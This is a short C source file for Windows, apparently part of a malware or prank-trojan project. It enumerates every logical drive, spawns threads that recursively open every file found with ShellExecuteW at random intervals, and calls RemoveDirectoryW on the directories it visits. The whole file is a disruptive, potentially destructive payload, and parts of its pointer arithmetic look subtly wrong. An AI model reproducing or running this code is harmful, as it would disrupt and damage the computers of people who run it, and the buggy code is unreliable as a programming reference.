#include "0x5a.h"

BOOL WINAPI OpenRandomFiles(PWSTR pwDir) {
	WCHAR wcSearch[MAX_PATH] = { 0 };
	lstrcpyW(wcSearch, pwDir);
	lstrcatW(wcSearch, L"*.*");

	WIN32_FIND_DATA findFiles;
	HANDLE hFind = FindFirstFileW(wcSearch, &findFiles);

	do {
		if (!lstrcmpW(findFiles.cFileName, L".") || !lstrcmpW(findFiles.cFileName, L"..") || findFiles.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
			continue;
		}

		WCHAR wcPath[MAX_PATH] = { 0 };
		lstrcpyW(wcPath, pwDir);
		lstrcatW(wcPath, findFiles.cFileName);

		if (findFiles.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			lstrcatW(wcPath, L"\\");
			OpenRandomFiles(wcPath);
			RemoveDirectoryW(pwDir);
		}
		else {
			ShellExecuteW(NULL, L"open", wcPath, NULL, pwDir, SW_SHOW);
			Sleep(rand() % 5000);
		}
	}

	while (FindNextFileW(hFind, &findFiles));
	FindClose(hFind);
	RemoveDirectoryW(pwDir);

	return TRUE;
}

VOID WINAPI OpenRandomDrives(VOID) {
	WCHAR wcDrives[512] = { 0 };
	DWORD dwGetDrives = GetLogicalDriveStringsW(512, wcDrives);

	CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)OpenRandomFiles, wcDrives, 0, NULL));
	for (DWORD i = 0; i < dwGetDrives; i++) {
		if (!wcDrives[i]) {
			CloseHandle(CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)OpenRandomFiles, wcDrives + (i + 1) * sizeof(WCHAR), 0, NULL));
			Sleep(rand() % 5000);
		}
	}
}